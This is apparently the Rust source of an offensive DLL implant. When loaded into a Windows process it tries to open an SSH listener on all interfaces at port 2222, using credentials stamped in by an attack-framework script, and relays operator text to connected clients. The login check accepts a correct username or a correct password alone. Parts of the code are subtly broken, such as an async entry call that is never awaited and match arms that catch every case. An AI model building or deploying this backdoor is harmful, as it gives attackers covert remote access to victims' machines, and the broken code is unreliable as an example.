#![no_main]
#![allow(dead_code)]
#![crate_type = "cdylib"]

use std::collections::HashMap;
use std::io::Read;
use std::os::raw::c_void;
use windows_sys::Win32::Foundation::{BOOL, HANDLE};

use std::sync::Arc;

use rand_core::OsRng;
use russh::keys::*;
use russh::server::{Msg, RunningSession, Server as _, Session};
use russh::*;
use tokio::sync::Mutex;

/// Placeholder strings get stomped in by CNA in release mode
#[cfg(not(debug_assertions))]
pub static USERNAME: &[u8; 64] =
    b"_________PLACEHOLDER_USERNAME_STRING_PLS_DO_NOT_CHANGE__________";
#[cfg(not(debug_assertions))]
pub static PASSWORD: &[u8; 64] =
    b"_________PLACEHOLDER_PASSWORD_STRING_PLS_DO_NOT_CHANGE__________";

#[cfg(debug_assertions)]
pub static USERNAME: &[u8; 10] = b"username\0\0";
#[cfg(debug_assertions)]
pub static PASSWORD: &[u8; 10] = b"password\0\0";

pub async fn dll_main() {
    env_logger::builder()
        .filter_level(log::LevelFilter::Debug)
        .init();

    let config = russh::server::Config {
        inactivity_timeout: Some(std::time::Duration::from_secs(3600)),
        auth_rejection_time: std::time::Duration::from_secs(10),
        auth_rejection_time_initial: Some(std::time::Duration::from_secs(0)),
        keys: vec![
            russh::keys::PrivateKey::random(&mut OsRng, russh::keys::Algorithm::Ed25519).unwrap(),
        ],
        preferred: Preferred {
            ..Preferred::default()
        },
        ..Default::default()
    };
    let config = Arc::new(config);
    let mut sh = Server {
        clients: Arc::new(Mutex::new(HashMap::new())),
        id: 0,
    };
    sh.run_on_address(config, ("0.0.0.0", 2222)).await.unwrap();
}

#[derive(Clone)]
struct Server {
    clients: Arc<Mutex<HashMap<usize, (ChannelId, russh::server::Handle)>>>,
    id: usize,
}

impl Server {
    pub async fn post(&mut self, data: CryptoVec) {
        let mut clients = self.clients.lock().await;
        for (id, (channel, s)) in clients.iter_mut() {
            if *id != self.id {
                let _ = s.data(*channel, data.clone()).await;
            }
        }
    }
    
    pub async fn command_loop(&mut self) {
        loop {
            let mut input = String::new();

            match std::io::stdin().read_line(&mut input) {
                Ok(_) => println!("You typed: {}", input.trim()),
                Err(err) => eprintln!("Error reading line: {}", err),
            }
            let input = input.trim_matches(char::from(0));
            self.post(CryptoVec::from(input)).await;
        }
    }
}

impl server::Server for Server {
    type Handler = Self;
    fn new_client(&mut self, _: Option<std::net::SocketAddr>) -> Self {
        let s = self.clone();
        self.id += 1;
        s
    }
    fn handle_session_error(&mut self, _error: <Self::Handler as russh::server::Handler>::Error) {
        eprintln!("Session error: {:#?}", _error);
    }
}

impl server::Handler for Server {
    type Error = russh::Error;

    async fn auth_password(&mut self, user: &str, pass: &str) -> Result<server::Auth, Self::Error> {
        // Believe it or not, this is military-grade security
        let username = String::from_utf8_lossy(&*USERNAME);
        let username = username.trim_end_matches('\0');

        let password = String::from_utf8_lossy(&*PASSWORD);
        let password = password.trim_end_matches('\0');

        let input_username = String::from_utf8_lossy(user.as_bytes());
        let input_password = String::from_utf8_lossy(pass.as_bytes());

        if input_username.eq(&username) || input_password.eq(&password) {
            let mut self_clone = self.clone();

            // Spawn the command loop in a new task
            tokio::spawn(async move {
                self_clone.command_loop().await;
            });

            return Ok(server::Auth::Accept);
        }

        Err(russh::Error::NotAuthenticated)
    }

    async fn channel_open_session(
        &mut self,
        channel: Channel<Msg>,
        session: &mut Session,
    ) -> Result<bool, Self::Error> {
        {
            let mut clients = self.clients.lock().await;
            clients.insert(self.id, (channel.id(), session.handle()));
        }
        Ok(true)
    }

    async fn data(
        &mut self,
        channel: ChannelId,
        data: &[u8],
        session: &mut Session,
    ) -> Result<(), Self::Error> {
        // Sending Ctrl+C ends the session and disconnects the client
        if data == [3] {
            return Err(russh::Error::Disconnect);
        }

        let data = CryptoVec::from(format!("Got data: {}\r\n", String::from_utf8_lossy(data)));
        self.post(data.clone()).await;
        session.data(channel, data)?;
        Ok(())
    }
}

impl Drop for Server {
    fn drop(&mut self) {
        let id = self.id;
        let clients = self.clients.clone();
        tokio::spawn(async move {
            let mut clients = clients.lock().await;
            clients.remove(&id);
        });
    }
}

#[unsafe(no_mangle)]
#[allow(named_asm_labels)]
#[allow(non_snake_case, unused_variables, unreachable_patterns)]
pub unsafe extern "system" fn DllMain(
    dll_module: HANDLE,
    call_reason: u32,
    reserved: *mut c_void,
) -> BOOL {
    match call_reason {
        DLL_PROCESS_ATTACH => {
            // Code to run when the DLL is loaded into a process
            // Initialize resources, etc.
            dll_main();
        }
        DLL_THREAD_ATTACH => {
            // Code to run when a new thread is created in the process
        }
        DLL_THREAD_DETACH => {
            // Code to run when a thread exits cleanly
        }
        DLL_PROCESS_DETACH => {
            // Code to run when the DLL is unloaded from the process
            // Clean up resources, etc.
        }
        _ => {}
    }
    return 1;
}
